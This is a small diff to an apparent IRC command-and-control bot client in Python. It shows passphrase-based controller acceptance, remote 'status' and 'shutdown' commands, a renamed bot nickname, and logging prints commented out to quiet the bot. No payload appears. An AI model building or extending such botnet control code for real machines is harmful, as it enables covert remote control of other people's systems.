@@ -12,7 +12,7 @@ class Bot:
         self.PHRASE = phrase
         self.IRCSOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # CONTROLLER INFO
-        self.botNick = "SLAVE778"
+        self.botNick = "SLAVE77"
         self.liveConnection = False # Flag to see if controller connection to IRC Server is active
         self.command = None
 
@@ -61,12 +61,12 @@ class Bot:
         if message == self.PHRASE:
             self.acceptedCons.append(prefix)
         if prefix in self.acceptedCons:
-            print("from " + prefix + " to do " + message)
+            #print("from " + prefix + " to do " + message)
             if message == "status":
-                print("sending back status")
+                #print("sending back status")
                 self.privateMsg(prefix, "Correct pass - " + self.botNick)
             if message == "shutdown":
-                print("shutting down")
+                #print("shutting down")
                 self.privateMsg(prefix, "Shutdown successful - " + self.botNick)
                 self.IRCSOCKET.close()
                 sys.exit(0)
